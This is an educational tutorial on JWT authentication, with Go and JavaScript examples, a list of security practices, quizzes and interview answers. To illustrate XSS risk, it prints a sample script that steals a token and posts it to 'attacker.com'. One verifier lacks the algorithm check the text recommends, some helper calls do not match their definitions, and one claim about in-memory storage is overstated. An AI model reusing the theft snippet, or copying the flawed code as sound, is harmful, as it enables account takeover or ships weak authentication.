# 2.3 JWT Tokens

## What is JWT?

**JWT (JSON Web Token)** = Compact, self-contained way to transmit information between parties as a JSON object.

**Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

├─────────── Header ──────────┤├────────── Payload ─────────┤├─── Signature ───┤
```

**Three parts separated by dots:**
1. Header (algorithm & token type)
2. Payload (claims/data)
3. Signature (verification)

---

## JWT Structure

### 1. Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Base64 encoded: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

---

### 2. Payload (Claims)

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}
```

Base64 encoded: `eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ`

---

### 3. Signature

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

---

## Standard Claims

| Claim | Name | Description | Example |
|-------|------|-------------|---------|
| `sub` | Subject | User identifier | "user123" |
| `iss` | Issuer | Who created token | "https://api.example.com" |
| `aud` | Audience | Who token is for | "https://example.com" |
| `exp` | Expiration | When token expires | 1516242622 (Unix timestamp) |
| `iat` | Issued At | When token was created | 1516239022 |
| `nbf` | Not Before | Token not valid before | 1516239022 |
| `jti` | JWT ID | Unique token ID | "abc123" |

**Custom claims:**
```json
{
  "user_id": 123,
  "email": "john@example.com",
  "role": "admin",
  "permissions": ["read", "write"]
}
```

---

## How JWT Works

```
┌─────────┐                          ┌─────────┐
│ Client  │                          │ Server  │
└────┬────┘                          └────┬────┘
     │                                    │
     │ 1. POST /login                     │
     │    { email, password }             │
     │ ─────────────────────────────────> │
     │                                    │
     │                                2. Validate credentials
     │                                3. Generate JWT
     │                                    │
     │ 4. { token: "eyJhbGc..." }         │
     │ <───────────────────────────────── │
     │                                    │
     │ 5. Store token (memory/localStorage)
     │                                    │
     │ 6. GET /api/profile                │
     │    Authorization: Bearer eyJhbGc...│
     │ ─────────────────────────────────> │
     │                                    │
     │                                7. Verify signature
     │                                8. Check expiration
     │                                9. Extract user from payload
     │                                    │
     │ 10. { user: {...} }                │
     │ <───────────────────────────────── │
```

---

## JWT Implementation (Go)

```go
package main

import (
    "errors"
    "time"
    
    "github.com/golang-jwt/jwt/v5"
)

var secretKey = []byte("your-secret-key-keep-it-safe")

type Claims struct {
    UserID int    `json:"user_id"`
    Email  string `json:"email"`
    Role   string `json:"role"`
    jwt.RegisteredClaims
}

// Generate JWT token
func GenerateJWT(userID int, email, role string) (string, error) {
    claims := Claims{
        UserID: userID,
        Email:  email,
        Role:   role,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            Issuer:    "my-app",
        },
    }
    
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(secretKey)
}

// Verify and parse JWT
func VerifyJWT(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        // Verify signing method
        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
            return nil, errors.New("invalid signing method")
        }
        return secretKey, nil
    })
    
    if err != nil {
        return nil, err
    }
    
    if claims, ok := token.Claims.(*Claims); ok && token.Valid {
        return claims, nil
    }
    
    return nil, errors.New("invalid token")
}

// Middleware to protect routes
func AuthMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Get token from Authorization header
        authHeader := r.Header.Get("Authorization")
        if authHeader == "" {
            http.Error(w, "Missing authorization header", 401)
            return
        }
        
        // Extract token (format: "Bearer <token>")
        tokenString := strings.TrimPrefix(authHeader, "Bearer ")
        if tokenString == authHeader {
            http.Error(w, "Invalid authorization format", 401)
            return
        }
        
        // Verify token
        claims, err := VerifyJWT(tokenString)
        if err != nil {
            http.Error(w, "Invalid token", 401)
            return
        }
        
        // Add claims to context
        ctx := context.WithValue(r.Context(), "user", claims)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

---

## Complete Example: Login & Protected Route

```go
package main

import (
    "context"
    "encoding/json"
    "net/http"
    "strings"
    "time"
    
    "github.com/golang-jwt/jwt/v5"
    "golang.org/x/crypto/bcrypt"
)

var secretKey = []byte("your-256-bit-secret")

type User struct {
    ID       int    `json:"id"`
    Email    string `json:"email"`
    Password string `json:"-"`
    Role     string `json:"role"`
}

type Claims struct {
    UserID int    `json:"user_id"`
    Email  string `json:"email"`
    Role   string `json:"role"`
    jwt.RegisteredClaims
}

// Mock database
var users = map[string]User{
    "john@example.com": {
        ID:       1,
        Email:    "john@example.com",
        Password: "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy", // "password123"
        Role:     "admin",
    },
}

func GenerateJWT(userID int, email, role string) (string, error) {
    claims := Claims{
        UserID: userID,
        Email:  email,
        Role:   role,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            Issuer:    "my-api",
        },
    }
    
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(secretKey)
}

func VerifyJWT(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        return secretKey, nil
    })
    
    if err != nil {
        return nil, err
    }
    
    if claims, ok := token.Claims.(*Claims); ok && token.Valid {
        return claims, nil
    }
    
    return nil, jwt.ErrSignatureInvalid
}

// Login handler
func LoginHandler(w http.ResponseWriter, r *http.Request) {
    var req struct {
        Email    string `json:"email"`
        Password string `json:"password"`
    }
    
    json.NewDecoder(r.Body).Decode(&req)
    
    // Find user
    user, exists := users[req.Email]
    if !exists {
        http.Error(w, "Invalid email or password", 401)
        return
    }
    
    // Verify password
    err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(req.Password))
    if err != nil {
        http.Error(w, "Invalid email or password", 401)
        return
    }
    
    // Generate token
    token, err := GenerateJWT(user.ID, user.Email, user.Role)
    if err != nil {
        http.Error(w, "Failed to generate token", 500)
        return
    }
    
    json.NewEncoder(w).Encode(map[string]interface{}{
        "token": token,
        "user":  user,
    })
}

// Protected route
func ProfileHandler(w http.ResponseWriter, r *http.Request) {
    // Get claims from context (set by middleware)
    claims := r.Context().Value("user").(*Claims)
    
    json.NewEncoder(w).Encode(map[string]interface{}{
        "user_id": claims.UserID,
        "email":   claims.Email,
        "role":    claims.Role,
    })
}

// Middleware
func AuthMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        authHeader := r.Header.Get("Authorization")
        if authHeader == "" {
            http.Error(w, "Missing token", 401)
            return
        }
        
        tokenString := strings.TrimPrefix(authHeader, "Bearer ")
        claims, err := VerifyJWT(tokenString)
        if err != nil {
            http.Error(w, "Invalid token", 401)
            return
        }
        
        ctx := context.WithValue(r.Context(), "user", claims)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}

func main() {
    http.HandleFunc("/login", LoginHandler)
    http.Handle("/profile", AuthMiddleware(http.HandlerFunc(ProfileHandler)))
    
    http.ListenAndServe(":8080", nil)
}
```

**Usage:**
```bash
# Login
curl -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@example.com","password":"password123"}'

# Response:
# {
#   "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
#   "user": {...}
# }

# Access protected route
curl http://localhost:8080/profile \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

---

## JWT vs Session

| Feature | JWT | Session |
|---------|-----|---------|
| Storage | Client-side | Server-side |
| Stateless | ✅ Yes | ❌ No |
| Scalability | ✅ Easy | ⚠️ Harder (sticky sessions) |
| Revocation | ❌ Hard | ✅ Easy |
| Size | Larger (entire payload) | Smaller (just ID) |
| CORS | ✅ Easy | ⚠️ Harder |
| Best for | Microservices, APIs | Traditional web apps |

---

## JWT Security Best Practices

### 1. Use Strong Secret

```go
❌ var secret = []byte("secret")
✅ var secret = []byte("at-least-256-bits-random-string-never-commit-to-git")
```

**Generate secure secret:**
```bash
openssl rand -base64 32
```

---

### 2. Set Short Expiration

```go
ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute))  // 15 min
```

Use refresh tokens for longer sessions.

---

### 3. Use HTTPS Only

```
❌ http://api.example.com
✅ https://api.example.com
```

JWT in HTTP = anyone can intercept and steal it.

---

### 4. Don't Store Sensitive Data

```go
❌ Claims {
    UserID: 123,
    CreditCard: "1234-5678-9012-3456"  // NEVER!
}

✅ Claims {
    UserID: 123,
    Role: "admin"
}
```

JWT is **encoded**, not **encrypted**. Anyone can decode and read it.

---

### 5. Verify Signature Always

```go
token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
    // ✅ Verify algorithm
    if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
        return nil, errors.New("invalid signing method")
    }
    return secretKey, nil
})
```

---

### 6. Validate Claims

```go
claims, err := VerifyJWT(tokenString)
if err != nil {
    return err
}

// Check expiration
if time.Now().After(claims.ExpiresAt.Time) {
    return errors.New("token expired")
}

// Check issuer
if claims.Issuer != "my-app" {
    return errors.New("invalid issuer")
}
```

---

## Common JWT Attacks & Prevention

### 1. None Algorithm Attack

**Attack:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Attacker sets algorithm to "none" to bypass signature verification.

**Prevention:**
```go
✅ if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
    return nil, errors.New("invalid signing method")
}
```

---

### 2. Algorithm Confusion

**Attack:** Change `HS256` to `RS256` using public key as secret.

**Prevention:**
```go
✅ Explicitly check signing method
if token.Method.Alg() != "HS256" {
    return nil, errors.New("unexpected signing method")
}
```

---

### 3. Token Theft (XSS)

**Attack:** Steal token from localStorage via XSS.

**Prevention:**
```javascript
✅ Store in memory (React state, not localStorage)
✅ Or use httpOnly cookies (can't access via JavaScript)
```

---

## Where to Store JWT (Client-Side)

### Option 1: localStorage ⚠️

```javascript
localStorage.setItem('token', token)
```

**Pros:**
- Simple
- Persists across tabs

**Cons:**
- Vulnerable to XSS
- Accessible to all scripts

---

### Option 2: Memory (React State) ✅ Safer

```javascript
const [token, setToken] = useState(null)
```

**Pros:**
- Not accessible via XSS
- Safe from script injection

**Cons:**
- Lost on page refresh
- Need refresh token pattern

---

### Option 3: httpOnly Cookie ✅ Most Secure

```go
http.SetCookie(w, &http.Cookie{
    Name:     "token",
    Value:    token,
    HttpOnly: true,  // Can't access via JavaScript
    Secure:   true,  // HTTPS only
    SameSite: http.SameSiteStrictMode,
})
```

**Pros:**
- Not accessible via JavaScript (XSS protection)
- Automatic sending

**Cons:**
- CSRF vulnerability (need CSRF tokens)
- CORS complexity

---

## Refresh Token Pattern

**Problem:** JWT can't be revoked before expiry.

**Solution:** Short-lived access token + long-lived refresh token.

```
Access Token: 15 minutes (JWT)
Refresh Token: 7 days (stored in database)
```

**Flow:**
```
1. Login → Get access token (15 min) + refresh token (7 days)
2. Use access token for API calls
3. Access token expires after 15 min
4. Use refresh token to get new access token
5. Repeat
```

**Implementation:**
```go
// Generate tokens
func GenerateTokens(userID int) (string, string, error) {
    // Access token (15 min)
    accessToken, _ := GenerateJWT(userID, 15*time.Minute)
    
    // Refresh token (7 days)
    refreshToken := generateRandomString(32)
    
    // Store refresh token in database
    SaveRefreshToken(userID, refreshToken, 7*24*time.Hour)
    
    return accessToken, refreshToken, nil
}

// Refresh endpoint
func RefreshHandler(w http.ResponseWriter, r *http.Request) {
    var req struct {
        RefreshToken string `json:"refresh_token"`
    }
    json.NewDecoder(r.Body).Decode(&req)
    
    // Validate refresh token from database
    userID, err := ValidateRefreshToken(req.RefreshToken)
    if err != nil {
        http.Error(w, "Invalid refresh token", 401)
        return
    }
    
    // Generate new access token
    newAccessToken, _ := GenerateJWT(userID, 15*time.Minute)
    
    json.NewEncoder(w).Encode(map[string]string{
        "access_token": newAccessToken,
    })
}
```

---

## Practice Questions

<details>
<summary><strong>View Questions</strong></summary>

### Fill in the Blanks

1. JWT consists of three parts: __________, __________, and __________.
2. The claim __________ indicates when the token expires.
3. JWT is __________ not encrypted, so anyone can read the payload.
4. The recommended expiration time for access tokens is __________ minutes.

### True/False

1. ⬜ JWT tokens are encrypted
2. ⬜ JWT tokens are stored on the server
3. ⬜ Once issued, JWT cannot be invalidated before expiry
4. ⬜ It's safe to store credit card numbers in JWT payload
5. ⬜ localStorage is the most secure place to store JWT

### Multiple Choice

1. Which is NOT part of a JWT?
   - A) Header
   - B) Payload
   - C) Secret Key
   - D) Signature

2. What should you check when verifying JWT?
   - A) Signature validity
   - B) Expiration time
   - C) Signing algorithm
   - D) All of the above

3. Where is JWT typically sent in HTTP requests?
   - A) In URL query parameters
   - B) In Authorization header
   - C) In request body
   - D) In Cookie header

---

### Answers

<details>
<summary><strong>View Answers</strong></summary>

**Fill in the Blanks:**
1. Header, Payload, Signature
2. exp
3. encoded (base64)
4. 15 (or 5-30 range acceptable)

**True/False:**
1. ❌ False - JWT is encoded (base64), not encrypted
2. ❌ False - JWT is stored on client-side (stateless)
3. ✅ True - JWT cannot be revoked; use short expiry + refresh tokens
4. ❌ False - Never store sensitive data; JWT payload is readable
5. ❌ False - Memory or httpOnly cookies are safer (XSS protection)

**Multiple Choice:**
1. **C** - Secret key is used to sign but not part of the token itself
2. **D** - All checks are necessary for security
3. **B** - `Authorization: Bearer <token>` is standard

</details>

</details>

---

## Interview Questions

<details>
<summary><strong>View Questions</strong></summary>

### Question 1: Explain how JWT works and its structure

### Question 2: What are the security concerns with JWT? How do you address them?

### Question 3: JWT vs Session-based authentication - when to use each?

### Question 4: How do you handle JWT expiration? Explain the refresh token pattern.

### Question 5: Where should you store JWT on the client-side and why?

---

### Answers

<details>
<summary><strong>View Answers</strong></summary>

### Answer 1: How JWT works

**Structure:**
```
eyJhbGc...  .  eyJzdWI...  .  SflKxw...
  Header       Payload      Signature
```

**Three parts:**

**1. Header**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Defines algorithm and token type.

**2. Payload (Claims)**
```json
{
  "user_id": 123,
  "email": "john@example.com",
  "role": "admin",
  "exp": 1737027600,
  "iat": 1737024000
}
```
Contains user data and metadata.

**3. Signature**
```
HMACSHA256(
  base64(header) + "." + base64(payload),
  secret
)
```
Verifies token hasn't been tampered with.

**How it works:**

```
1. User logs in
   POST /login { email, password }

2. Server validates credentials

3. Server creates JWT:
   - Header: { "alg": "HS256", "typ": "JWT" }
   - Payload: { "user_id": 123, "exp": ... }
   - Signature: HMAC(header + payload, secret)

4. Server returns token
   { "token": "eyJhbGc..." }

5. Client stores token (memory/localStorage)

6. Client sends token with requests
   Authorization: Bearer eyJhbGc...

7. Server verifies:
   - Decode header and payload
   - Recalculate signature
   - Compare signatures
   - Check expiration
   - Extract user info

8. Server grants access if valid
```

**Key point:** Server doesn't need to store tokens (stateless).

---

### Answer 2: Security concerns

**1. JWT is encoded, not encrypted**

```
Problem: Anyone can decode and read payload
```

```javascript
// Anyone can do this:
const payload = JSON.parse(atob(token.split('.')[1]))
console.log(payload)  // See all data
```

**Solution:**
- Don't store sensitive data (passwords, SSN, credit cards)
- Only store user ID, role, basic info

---

**2. Token theft (XSS)**

```
Problem: If stored in localStorage, XSS can steal it
```

```javascript
// Malicious script:
const token = localStorage.getItem('token')
fetch('https://attacker.com/steal', { 
    body: JSON.stringify({ token }) 
})
```

**Solution:**
- Store in memory (React state)
- Or httpOnly cookies (can't access via JS)
- Implement CSP (Content Security Policy)

---

**3. Can't revoke before expiry**

```
Problem: User logs out but token still valid for hours
```

**Solution:**
- Short expiration (15 minutes)
- Refresh token pattern
- Token blacklist (defeats stateless purpose)

---

**4. Algorithm confusion attack**

```json
// Attacker changes header:
{
  "alg": "none"  // No signature required
}
```

**Solution:**
```go
// Always verify algorithm
if token.Method.Alg() != "HS256" {
    return errors.New("invalid algorithm")
}
```

---

**5. Weak secret key**

```go
❌ var secret = []byte("secret123")
```

**Solution:**
```go
✅ var secret = []byte("at-least-256-bits-random-string")

// Generate:
openssl rand -base64 32
```

---

**6. Missing HTTPS**

```
Problem: Token sent over HTTP can be intercepted
```

**Solution:**
- Always use HTTPS
- Set `Secure` flag on cookies

---

**Complete secure implementation:**

```go
func GenerateSecureJWT(userID int) (string, error) {
    claims := Claims{
        UserID: userID,  // Only non-sensitive data
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(15 * time.Minute)),  // Short expiry
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            Issuer:    "my-secure-app",
        },
    }
    
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(strongSecret)  // Strong secret
}

func VerifySecureJWT(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
        // Verify algorithm
        if token.Method.Alg() != "HS256" {
            return nil, errors.New("invalid algorithm")
        }
        return strongSecret, nil
    })
    
    if err != nil {
        return nil, err
    }
    
    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, errors.New("invalid token")
    }
    
    // Additional validation
    if time.Now().After(claims.ExpiresAt.Time) {
        return nil, errors.New("token expired")
    }
    
    return claims, nil
}
```

---

### Answer 3: JWT vs Session

**JWT (Token-Based)**

**How it works:**
```
Client stores token → Sends with each request → Server verifies
No server-side storage
```

**Pros:**
- ✅ Stateless (no server storage)
- ✅ Scales horizontally (any server can verify)
- ✅ Works across domains (CORS friendly)
- ✅ Mobile-friendly
- ✅ Microservices-friendly

**Cons:**
- ❌ Can't revoke before expiry
- ❌ Larger payload (entire token sent)
- ❌ XSS vulnerability if stored in localStorage

**Use when:**
- Building APIs for mobile apps
- Microservices architecture
- Need to scale horizontally
- Cross-domain authentication

---

**Session-Based**

**How it works:**
```
Server stores session → Sends session ID in cookie → Server looks up session
```

**Pros:**
- ✅ Easy to revoke (delete session)
- ✅ Smaller cookies (just session ID)
- ✅ More control (server manages everything)
- ✅ Can store more data

**Cons:**
- ❌ Requires server storage (Redis/database)
- ❌ Harder to scale (sticky sessions)
- ❌ CORS complications
- ❌ Not RESTful (stateful)

**Use when:**
- Traditional web applications
- Need immediate revocation
- Single domain
- Don't need to scale massively

---

**Comparison Table:**

| Feature | JWT | Session |
|---------|-----|---------|
| Storage | Client | Server |
| Stateless | ✅ | ❌ |
| Revocation | Hard | Easy |
| Scaling | Easy | Harder |
| Size | Larger | Smaller |
| CORS | Easy | Complex |

**Real-world examples:**

**JWT:**
- GitHub API
- Auth0
- Mobile apps

**Session:**
- Traditional web apps (Rails, Django)
- Banking applications
- When immediate logout required

**Hybrid approach:**
```
- Short JWT (15 min)
- Refresh token stored server-side (like session)
- Best of both worlds
```

---

### Answer 4: JWT expiration & refresh tokens

**Problem with long-lived JWT:**

```
JWT expires in: 7 days

Problem:
- User logs out → Token still valid for 7 days
- Compromised token valid for 7 days
- Can't revoke
```

**Solution: Refresh Token Pattern**

**Two tokens:**
1. **Access Token** (JWT) - Short-lived (15 min)
2. **Refresh Token** - Long-lived (7 days), stored server-side

**Flow:**

```
1. Login
   POST /auth/login
   { email, password }
   
   Response:
   {
     "access_token": "eyJhbGc...",  // 15 min
     "refresh_token": "abc123xyz"   // 7 days
   }

2. Use access token for API calls
   GET /api/profile
   Authorization: Bearer eyJhbGc...
   
3. Access token expires (after 15 min)
   GET /api/profile
   Response: 401 Unauthorized
   
4. Use refresh token to get new access token
   POST /auth/refresh
   { "refresh_token": "abc123xyz" }
   
   Response:
   { "access_token": "eyJnew..." }  // New 15 min token
   
5. Continue using new access token

6. Logout
   POST /auth/logout
   Delete refresh token from database
   All tokens invalidated immediately
```

**Implementation:**

```go
type RefreshToken struct {
    Token     string
    UserID    int
    ExpiresAt time.Time
}

// Login - generate both tokens
func Login(email, password string) (string, string, error) {
    // Validate credentials
    user := ValidateCredentials(email, password)
    if user == nil {
        return "", "", errors.New("invalid credentials")
    }
    
    // Generate access token (15 min JWT)
    accessToken, _ := GenerateJWT(user.ID, 15*time.Minute)
    
    // Generate refresh token (random string)
    refreshToken := generateRandomString(32)
    
    // Store refresh token in database
    db.Create(&RefreshToken{
        Token:     refreshToken,
        UserID:    user.ID,
        ExpiresAt: time.Now().Add(7 * 24 * time.Hour),
    })
    
    return accessToken, refreshToken, nil
}

// Refresh - get new access token
func Refresh(refreshTokenString string) (string, error) {
    // Find refresh token in database
    var rt RefreshToken
    err := db.Where("token = ? AND expires_at > ?", 
        refreshTokenString, time.Now()).First(&rt).Error
    
    if err != nil {
        return "", errors.New("invalid refresh token")
    }
    
    // Generate new access token
    newAccessToken, _ := GenerateJWT(rt.UserID, 15*time.Minute)
    
    return newAccessToken, nil
}

// Logout - revoke refresh token
func Logout(refreshTokenString string) error {
    return db.Where("token = ?", refreshTokenString).Delete(&RefreshToken{}).Error
}
```

**Client-side handling:**

```javascript
// Store tokens
const accessToken = response.access_token   // Memory
const refreshToken = response.refresh_token // httpOnly cookie

// API call with auto-refresh
async function apiCall(url) {
    let response = await fetch(url, {
        headers: { 'Authorization': `Bearer ${accessToken}` }
    })
    
    if (response.status === 401) {
        // Access token expired, refresh it
        const newAccessToken = await refreshAccessToken()
        
        // Retry with new token
        response = await fetch(url, {
            headers: { 'Authorization': `Bearer ${newAccessToken}` }
        })
    }
    
    return response.json()
}

async function refreshAccessToken() {
    const response = await fetch('/auth/refresh', {
        method: 'POST',
        credentials: 'include'  // Send refresh token cookie
    })
    
    const { access_token } = await response.json()
    return access_token
}
```

**Benefits:**

1. ✅ Short-lived access tokens (limited damage if stolen)
2. ✅ Can revoke refresh tokens (immediate logout)
3. ✅ Stateless API calls (access token is JWT)
4. ✅ Scalable (only refresh endpoint needs DB)

---

### Answer 5: Where to store JWT

**Three options:**

**1. localStorage** ⚠️ Vulnerable

```javascript
localStorage.setItem('token', token)
```

**Pros:**
- Simple
- Persists across tabs/refreshes

**Cons:**
- Vulnerable to XSS attacks
- Any script can access it

```javascript
// Malicious script injected via XSS:
const token = localStorage.getItem('token')
fetch('https://attacker.com', { 
    method: 'POST',
    body: JSON.stringify({ stolen: token })
})
```

**When to use:** Never for sensitive apps

---

**2. Memory (JavaScript variable)** ✅ Safer

```javascript
let accessToken = null

function setToken(token) {
    accessToken = token
}

function getToken() {
    return accessToken
}
```

**React example:**
```javascript
function App() {
    const [token, setToken] = useState(null)
    
    // Use token for API calls
}
```

**Pros:**
- Not accessible to XSS (not in DOM)
- Cleared on page refresh (security)

**Cons:**
- Lost on refresh (need refresh token)
- More complex to implement

**When to use:** High-security applications with refresh token pattern

---

**3. httpOnly Cookie** ✅ Most Secure

```go
http.SetCookie(w, &http.Cookie{
    Name:     "access_token",
    Value:    token,
    HttpOnly: true,         // Can't access via JavaScript
    Secure:   true,         // HTTPS only
    SameSite: http.SameSiteStrictMode,  // CSRF protection
    MaxAge:   900,          // 15 minutes
})
```

**Pros:**
- Not accessible via JavaScript (XSS protection)
- Automatically sent with requests
- Secure and HttpOnly flags

**Cons:**
- Vulnerable to CSRF (need CSRF tokens)
- More complex CORS setup

**When to use:** When you control both frontend and backend

---

**Recommended approach:**

**For SPAs (React, Vue):**
```javascript
// Access token: Memory
let accessToken = null

// Refresh token: httpOnly cookie
// Set by server, can't access via JS
```

**For traditional web apps:**
```javascript
// Both in httpOnly cookies
// Server handles everything
```

**Complete implementation:**

```go
// Server sets httpOnly cookie
func LoginHandler(w http.ResponseWriter, r *http.Request) {
    // ... validate credentials ...
    
    accessToken, refreshToken := GenerateTokens(user.ID)
    
    // Access token in httpOnly cookie
    http.SetCookie(w, &http.Cookie{
        Name:     "access_token",
        Value:    accessToken,
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
        MaxAge:   900,  // 15 min
    })
    
    // Refresh token in httpOnly cookie
    http.SetCookie(w, &http.Cookie{
        Name:     "refresh_token",
        Value:    refreshToken,
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
        MaxAge:   604800,  // 7 days
    })
    
    json.NewEncoder(w).Encode(map[string]string{
        "message": "Login successful"
    })
}
```

**Summary:**

| Storage | Security | Complexity | Best For |
|---------|----------|------------|----------|
| localStorage | ❌ Low | ✅ Simple | Public APIs |
| Memory | ✅ High | ⚠️ Medium | SPAs with refresh tokens |
| httpOnly Cookie | ✅ Highest | ⚠️ Complex | Full-stack apps |

</details>

</details>